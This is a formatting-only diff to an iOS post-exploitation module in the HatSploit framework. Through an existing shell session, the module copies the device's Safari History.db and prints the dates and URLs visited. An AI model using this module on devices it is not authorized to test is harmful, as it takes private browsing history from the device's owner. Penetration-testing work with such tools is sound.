@@ -12,33 +12,33 @@ from pex.db import DB
 
 class HatSploitModule(Module, Sessions, DB):
     details = {
-        'Category': "post",
-        'Name': "Obtain Safari history",
-        'Module': "post/apple_ios/shell/safari_history",
-        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
-        'Description': "Get iOS Safari history database and parse it.",
-        'Platform': "apple_ios",
-        'Rank': "medium",
+        "Category": "post",
+        "Name": "Obtain Safari history",
+        "Module": "post/apple_ios/shell/safari_history",
+        "Authors": ["Ivan Nikolsky (enty8080) - module developer"],
+        "Description": "Get iOS Safari history database and parse it.",
+        "Platform": "apple_ios",
+        "Rank": "medium",
     }
 
     options = {
-        'SESSION': {
-            'Description': "Session to run on.",
-            'Value': None,
-            'Type': {'session': {'Platforms': ['apple_ios'], 'Type': 'shell'}},
-            'Required': True,
+        "SESSION": {
+            "Description": "Session to run on.",
+            "Value": None,
+            "Type": {"session": {"Platforms": ["apple_ios"], "Type": "shell"}},
+            "Required": True,
         },
-        'PATH': {
-            'Description': "Path to save file.",
-            'Value': Loot().specific_loot('History.db'),
-            'Type': None,
-            'Required': True,
+        "PATH": {
+            "Description": "Path to save file.",
+            "Value": Loot().specific_loot("History.db"),
+            "Type": None,
+            "Required": True,
         },
     }
 
     def run(self):
         session, path = self.parse_options(self.options)
-        history = '/private/var/mobile/Library/Safari/History.db'
+        history = "/private/var/mobile/Library/Safari/History.db"
 
         path = self.session_download(session, history, path)
         if path:
@@ -52,9 +52,9 @@ class HatSploitModule(Module, Sessions, DB):
 
             history_data = []
             for item in history:
-                history_data.append((item['date'], item['details']['url']))
+                history_data.append((item["date"], item["details"]["url"]))
 
             if history_data:
-                self.print_table("History", ('Date', 'URL'), *history_data)
+                self.print_table("History", ("Date", "URL"), *history_data)
             else:
                 self.print_warning("No history available on device.")
